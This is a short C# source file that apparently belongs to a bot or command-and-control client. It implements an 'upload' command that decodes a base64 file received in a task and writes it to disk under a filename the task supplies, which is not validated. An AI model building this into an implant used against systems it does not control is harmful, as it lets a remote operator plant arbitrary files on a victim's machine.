using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class UploadFile : BotCommand
    {
        public override string TaskName => "upload";

        public override BotTaskResult RunTask(BotTask task)
        {
            string filename;
            if(task.IncomingFilename is null || task.IncomingFilename == "")
            {
                filename = Path.GetRandomFileName();

            }
            else
            {
                filename = task.IncomingFilename;   
            }

            byte[] bytes = Convert.FromBase64String(task.IncomingFile);
            File.WriteAllBytes(filename, bytes);

            
            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = $"Saved {filename} to {Directory.GetCurrentDirectory()}"
            };
        }
    }
}
